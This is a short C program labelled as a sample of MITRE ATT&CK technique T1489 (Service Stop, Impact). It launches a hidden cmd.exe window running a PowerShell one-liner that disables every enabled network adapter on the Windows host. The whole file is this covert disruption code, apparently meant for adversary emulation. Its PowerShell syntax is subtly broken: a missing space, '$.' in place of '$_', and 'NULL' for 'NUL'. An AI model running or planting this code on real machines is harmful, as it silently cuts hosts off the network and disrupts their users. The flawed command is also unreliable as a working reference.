// Link      = https://attack.mitre.org/techniques/T1489/
// Technique = Service Stop
// ID        = T1489
// Tactics   = Impact

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "powershell -Command \"Get-WmiObject-class Win32_NetworkAdapter | ForEach{ If($.NetEnabled) { $.Disable() } }\" > NULL",
        NULL,
        SW_HIDE
    );

    return 0;
}




